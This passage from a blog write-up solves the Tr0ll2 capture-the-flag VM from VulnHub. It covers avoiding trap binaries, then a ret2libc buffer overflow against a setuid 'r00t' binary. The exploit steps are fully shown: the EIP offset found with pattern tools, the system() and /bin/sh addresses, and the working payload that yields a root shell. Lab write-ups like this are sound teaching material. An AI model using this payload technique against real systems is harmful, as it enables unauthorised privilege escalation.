The system is going down <span style="color:#f00">for</span> reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
</code></pre></div><p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>
<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S <span style="color:#f60">1</span> door3/r00t
[...]
<span style="color:#f60">0001214</span> __libc_start_main
<span style="color:#f60">0001236</span> GLIBC_2.0
<span style="color:#f60">0001320</span> R
<span style="color:#f60">0001453</span> Q
<span style="color:#f60">0001521</span> %
<span style="color:#f60">0001526</span> h
<span style="color:#f60">0001626</span> h
<span style="color:#f60">0001646</span> h(
<span style="color:#f60">0002066</span> t&amp;
<span style="color:#f60">0002073</span> &#39;
<span style="color:#f60">0002305</span> i
<span style="color:#f60">0002620</span> Good job, stand by, executing root shell...
<span style="color:#f60">0002674</span> BUHAHAHA NOOB!
<span style="color:#f60">0002713</span> /sbin/reboot
<span style="color:#f60">0002733</span> ;<span style="color:#f60">0</span>
<span style="color:#f60">0002750</span> L
<span style="color:#f60">0002760</span> p
<span style="color:#f60">0003025</span> zR
<span style="color:#f60">0003044</span>
<span style="color:#f60">0003060</span> p
<span style="color:#f60">0003077</span> x
[...]
</code></pre></div><p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>
<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>
<h2 id="bof-bof-bof-your-boat">bof bof bof your boat&hellip;</h2>
<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>
<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>
<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
</code></pre></div><p>No security? EZ PEZE.</p>
<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#f00">)</span>
Segmentation fault
</code></pre></div><p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&gt;  (0xb7fff000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)

noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =&gt;  (0xb7fff000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)
</code></pre></div><p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>
<h2 id="the-exploit">the exploit</h2>
<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>
<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#f00">)</span>
Starting program: /tmp/r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#f00">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) x/x <span style="color:#eedd82">$eip</span>
0x41414141: Cannot access memory at address 0x41414141
</code></pre></div><p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>
<p>Lets generate the pattern.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb <span style="color:#f60">500</span>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</code></pre></div><p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r <span style="color:#87ceeb">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Starting program: /tmp/r00t <span style="color:#87ceeb">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
</code></pre></div><p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
[*] Exact match at offset <span style="color:#f60">268</span>
</code></pre></div><p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style="color:#f00">)</span>
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style="color:#f00">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) x/x <span style="color:#eedd82">$eip</span>
0x42424242: Cannot access memory at address 0x42424242
(gdb)
</code></pre></div><p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>
<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) b *main   <span style="color:#0f0"># here we break on the main function</span>
Breakpoint <span style="color:#f60">1</span> at 0x8048444: file bof.c, line 3.

(gdb) r         <span style="color:#0f0"># here we run the application....</span>
Starting program: /tmp/r00t

Breakpoint 1, main (<span style="color:#eedd82">argc</span>=1, <span style="color:#eedd82">argv</span>=0xbffffd84) at bof.c:3
<span style="color:#f60">3</span>   bof.c: No such file or directory.

(gdb) p system  <span style="color:#0f0"># and leak the locatin of system() in memory</span>
<span style="color:#eedd82">$1</span> = {&lt;text variable, no debug info&gt;} 0xb7e6b060 &lt;system&gt;
</code></pre></div><p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>
<p>So far our exploit payload will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">A * 268 + system() + JUNK
</code></pre></div><p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>
<p>So lets create this string, which we will refer to as the EGG.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ export <span style="color:#eedd82">EGG</span>=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
<span style="color:#eedd82">EGG</span>=/bin/sh
</code></pre></div><p>Next, we can use a small C program to tell us where this EGG is in memory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
<span style="color:#0f0">#include &lt;unistd.h&gt;</span>

int main(void)
{
  printf(<span style="color:#87ceeb">&#34;EGG address: 0x%lx\n&#34;</span>, getenv(<span style="color:#87ceeb">&#34;EGG&#34;</span>)+4);
  <span style="color:#f00">return</span> 0;
}

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[...]

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
</code></pre></div><p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>
<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">A * 268 + system() + JUNK + EGG
</code></pre></div><p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
Segmentation fault
</code></pre></div><p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># so just to recap, we check for the location of the EGG</span>
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

<span style="color:#0f0"># EGG is at 0xbfffff04, so in little endian format we have:</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
Segmentation fault

<span style="color:#0f0"># A segfault, lets move it up 1 byte</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x05\xff\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
sh: 1: =/bin/sh: not found
Segmentation fault

<span style="color:#0f0"># another segfault, however we have a little diagnostics message now</span>
<span style="color:#0f0"># showing that we are not far off :)</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
$
</code></pre></div><h2 id="trollin-the-rootin">trollin the rootin</h2>
<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
</code></pre></div><p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\xe2\xfe\xff\xbf&#34;&#39;</span><span style="color:#f00">)</span>
<span style="color:#0f0"># id</span>
<span style="color:#eedd82">uid</span>=1002(noob) <span style="color:#eedd82">gid</span>=1002(noob) <span style="color:#eedd82">euid</span>=0(root) <span style="color:#eedd82">groups</span>=0(root),1002(noob)
</code></pre></div><p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>
<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0"># cat /root/Proof.txt</span>
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
</code></pre></div><p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
    </div>
  </article>

  
  




  
    <div class="blog-post-comments">
        <div id="disqus_thread">
          <script type="text/javascript">
          
          (function() {
              
              
              
              
          
              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
              var disqus_shortname = 'slashnote';
              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
          })();
          </script>
          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </div>
    </div>

  


  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="https://leonjza.github.io/">Home</a></li>
         
          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
         
          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
         
          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#foreword">foreword</a></li>
    <li><a href="#getting-started">getting started</a></li>
    <li><a href="#web-server">web server</a></li>
    <li><a href="#ftpee">ftpee</a></li>
    <li><a href="#noob-key">noob key</a></li>
    <li><a href="#shocking-isnt-it">shocking isn&rsquo;t it</a></li>
    <li><a href="#which-door-leads-to-r00t">which door leads to r00t</a></li>
    <li><a href="#bof-bof-bof-your-boat">bof bof bof your boat&hellip;</a></li>
    <li><a href="#the-exploit">the exploit</a></li>
    <li><a href="#trollin-the-rootin">trollin the rootin</a></li>
  </ul>
</nav>
    </div>

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&text=another%20troll%20tamed%20solving%20troll%202" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&is_video=false&description=another%20troll%20tamed%20solving%20troll%202" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=another%20troll%20tamed%20solving%20troll%202&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&name=another%20troll%20tamed%20solving%20troll%202&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2ftr0ll-2%2c107%2f%22%3eTr0ll2%3c%2fa%3e%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fMaleus21%22%3e%40Maleus21%3c%2fa%3e%20hosted%20over%20at%20%3ca%20href%3d%22http%3a%2f%2fvulnhub.com%2f%22%3eVulnHub%3c%2fa%3e.%20Having%20been%20able%20to%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f15%2ftaming-the-troll%2f%22%3epwn%20Tr0ll1%3c%2fa%3e%2c%20I%20gave%20this%20one%20a%20shot%20too.%3c%2fp%3e%0a%3cp%3eHere%20is%20my%20experience%20taming%20the%20troll%2c%20again.%3c%2fp%3e" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&t=another%20troll%20tamed%20solving%20troll%202" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2021  Leon Jacobs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="https://leonjza.github.io/">Home</a></li>
         
        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
         
        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
         
        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
<script src=https://leonjza.github.io/js/main.js></script>
<script src=https://leonjza.github.io/js/code-copy.js></script>



</html>
